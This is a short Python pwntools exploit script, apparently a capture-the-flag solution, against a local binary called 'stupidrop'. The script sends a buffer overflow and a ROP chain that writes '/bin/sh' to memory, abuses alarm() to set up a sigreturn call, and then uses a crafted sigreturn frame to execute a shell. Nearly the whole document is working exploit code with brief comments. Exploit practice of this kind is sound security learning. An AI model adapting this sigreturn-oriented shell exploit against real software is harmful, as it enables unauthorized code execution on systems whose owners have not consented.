from pwn import * 


context(terminal=['tmux','new-window'])
p = process("./stupidrop")
#p=gdb.debug("./stupidrop","b *0x400621")

binary = ELF("stupidrop")


#gadgets
pop_rdi = 0x4006a3        #: pop rdi ; ret
syscall = 0x40063e        #: syscall

#function
gets = binary.symbols['gets']
alarm = binary.symbols['alarm']

#place to store /bin/sh\x00
bss = 0x601058


#1st point to memory
payload = ''
payload += 'a' * 56
payload += p64(pop_rdi)
payload += p64(bss) 
payload += p64(gets) 

#we need call sigreturn with rax=0xf = 15
payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(alarm)       #alarm(15) 
payload += p64(pop_rdi)     
payload += p64(0)
payload += p64(alarm)
payload += p64(syscall)

'''
in alarm function, return values are stored in the rax register.
'''


#2nd construct the sigreturn to call /bin/sh
frame = SigreturnFrame(arch="amd64")
frame.rax = 59                        #execve(/bin/sh,0,0) 
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall        


payload += str(frame)



p.sendline(payload)
p.sendline("/bin/sh\x00")
p.interactive()


